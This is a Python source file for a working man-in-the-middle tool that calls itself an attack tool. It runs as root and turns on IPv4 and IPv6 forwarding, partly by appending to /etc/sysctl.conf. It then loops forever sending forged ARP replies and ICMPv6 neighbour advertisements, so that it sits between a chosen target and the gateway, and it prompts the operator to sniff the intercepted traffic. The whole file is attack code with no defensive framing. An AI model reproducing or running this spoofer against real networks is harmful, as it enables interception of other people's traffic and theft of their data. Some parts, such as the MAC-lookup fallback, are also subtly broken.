from scapy.all import *
import os
import sys
import subprocess
from colorama import Fore,Style
import getmac

class Spoofer(object):
    def __init__(self, interface: str, gateway_ip: str,target_ip: str, target_ipv6: str, gateway_ipv6: str):
        self.interface=interface
        self.gateway_ip=gateway_ip
        self.target_ip=target_ip
        self.target_ipv6=target_ipv6
        self.gateway_ipv6=gateway_ipv6
    
    def execute(self):
        self.target_mac = self.__get_mac(self.target_ip)
        self.gateway_mac=self.__get_mac(self.gateway_ip)
        self.attacker_mac=self.__att_mac(self.interface)
        self.__enable_ipv4()
        if self.target_ipv6 and self.gateway_ipv6:
            self.__enable_ipv6()
        pack = self.__payload()
        self.__send_gratuitous_packets(pack)
    
    def __enable_ipv6(self):
        print('enabling ipv6 forwarding ')
        with open('/etc/sysctl.conf', 'r') as f:
            if 'net.ipv6.conf.all.forwarding=1' in f.read():
                return
        
        command = "echo 'net.ipv6.conf.all.forwarding=1' | sudo tee -a /etc/sysctl.conf"

        # Execute the command using subprocess
        subprocess.run(command, shell=True, check=True)

        # Apply the changes immediately
        subprocess.run("sudo sysctl -p", shell=True, check=True)
    
    def __enable_ipv4(self, config='/proc/sys/net/ipv4/ip_forward'):
        print('enabling ipv4 forwarding')
        with open(config, mode='r+', encoding='utf_8') as config_file:
            line = next(config_file)
            config_file.seek(0)
            config_file.write(line.replace('0', '1'))
    
    def __payload(self):
        packets=[]
        
        packet1 = Ether(dst=self.target_mac, src=self.attacker_mac) / ARP(op=2, psrc=self.gateway_ip, hwsrc=self.attacker_mac, hwdst=self.target_mac, pdst=self.target_ip)
        packet3 = Ether(dst=self.gateway_mac, src=self.attacker_mac) / ARP(op=2, psrc=self.target_ip, hwsrc=self.attacker_mac, hwdst=self.gateway_mac, pdst=self.gateway_ip)
        packets.append(packet1)
        packets.append(packet3)
        if self.target_ipv6 and self.gateway_ipv6:
            packet2 = Ether(dst=self.target_mac, src=self.attacker_mac) / IPv6(dst=self.target_ipv6) / ICMPv6ND_NA(tgt=self.target_ipv6, R=1, S=1, O=1)
            packet4 = Ether(dst=self.gateway_mac, src=self.attacker_mac) / IPv6(dst=self.gateway_ipv6) / ICMPv6ND_NA(tgt=self.gateway_ipv6, R=0, S=1, O=1)
            packets.append(packet2)
            packets.append(packet4)
        return packets
        
    def __get_mac(self,ip):
        print('getting mac addresses')
        for attempt in range(2):
            print(f"Attempt {attempt+1} to retrieve MAC address for {ip}")
            # Create ARP request packet
            arp_request = ARP(pdst=ip)
            mac1 = ''
            # Create Ethernet frame
            ether = Ether(dst="ff:ff:ff:ff:ff:ff")  # Broadcast MAC address

            # Combine Ethernet frame and ARP request
            packet = ether / arp_request

            # Send packet and receive response
            result = srp(packet, timeout=30, verbose=False)[0]

            # Extract MAC address from response
            for sent, received in result:
                mac1 = received.hwsrc
                break  # We only need the first MAC address, so we can break here
                        
            if mac1:
                print(Fore.BLUE + f"The MAC address of {ip} is {mac1}" + Style.RESET_ALL)
                return mac1
            else:
                print(Fore.RED + f"Attempt {attempt+1}: Unable to retrieve MAC address for {ip} . Retrying in 2 seconds." + Style.RESET_ALL)
                time.sleep(2)
    
        # If no MAC address is found after all attempts
        print(Fore.RED + f"Error: Unable to retrieve MAC address for {ip}. Make sure the IP address is reachable." + Style.RESET_ALL)
        mac1=input('please provide it manually')
    
    def __att_mac(self,interface):
        mac=''
        # Get MAC address using get_mac_address() function
        mac = getmac.get_mac_address(interface=interface)
        if mac:
            print(Fore.BLUE+f'your mac address: ',Style.RESET_ALL,mac)
            return mac
        else:
            print(Fore.RED+f"Failed to retrieve MAC address for interface{Fore.BLUE} {interface}",Style.RESET_ALL)
            exit(0)      
            
    def __send_gratuitous_packets(self, pack):
        # Construct the ARP packet

        # Send the ARP packet
        print("spoofing started use any network sniffing tool to interact network keep these program running ")
        while True:
            for loads in pack: 
                sendp(loads, iface=self.interface, verbose=False)
          
if __name__=='__main__':
	if os.getuid() != 0:
		raise SystemExit(Fore.RED+'Error: Permission denied. Execute this application '
                         'with administrator privileges.')
	print(Fore.RED+' these is a MITM attack tool design in python  ',Style.RESET_ALL)
	print('following information need for execution')
	info={'interface':'','gateway_ip':'','gateway_ipv6':'','target_ip':'','target_ipv6':''}
	for key, value in info.items():
            print(Fore.BLUE+f'{key}: {value}')
	n=input(Style.RESET_ALL+'continue for filling info(y/n)?')
	if n!='y':
	    exit(0)
	for key, value in info.items():
            info[key]=input(Fore.MAGENTA+'enter the value for '+key+':'+Style.RESET_ALL)    
	for key, value in info.items():
            print(Fore.BLUE+f'{key}: {Fore.YELLOW}{value}',Style.RESET_ALL)    
	spoof=Spoofer(info.get('interface'),info.get('gateway_ip'),info.get('target_ip'),info.get('target_ipv6'),info.get('gateway_ipv6')) 
	spoof.execute()